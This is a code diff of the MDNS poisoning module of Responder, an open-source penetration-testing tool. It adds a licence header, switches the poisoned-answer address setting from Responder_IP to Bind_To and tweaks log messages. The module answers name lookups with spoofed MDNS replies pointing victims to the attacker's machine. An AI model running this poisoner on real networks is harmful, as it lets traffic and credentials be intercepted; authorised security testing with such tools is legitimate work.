@@ -1,3 +1,19 @@
+#!/usr/bin/env python
+# This file is part of Responder
+# Original work by Laurent Gaffie - Trustwave Holdings
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import struct
 import settings
 import socket
@@ -37,18 +53,18 @@ class MDNS(BaseRequestHandler):
 			# Analyze
 			if settings.Config.AnalyzeMode:
 				if Parse_IPV6_Addr(data):
-					print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3, 0), color(Request_Name, 3, 0)))
+					print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3)))
 
+			# Poisoning Mode
 			else:
-				# Send poisoned packet
 				if Parse_IPV6_Addr(data):
 					
 					Poisoned_Name = Poisoned_MDNS_Name(data)
-					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Responder_IP))
+					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
 					Buffer.calculate()
 					soc.sendto(str(Buffer), (MADDR, MPORT))
 					
-					print color('[MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
+					print color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
 
 		except Exception:
 			raise
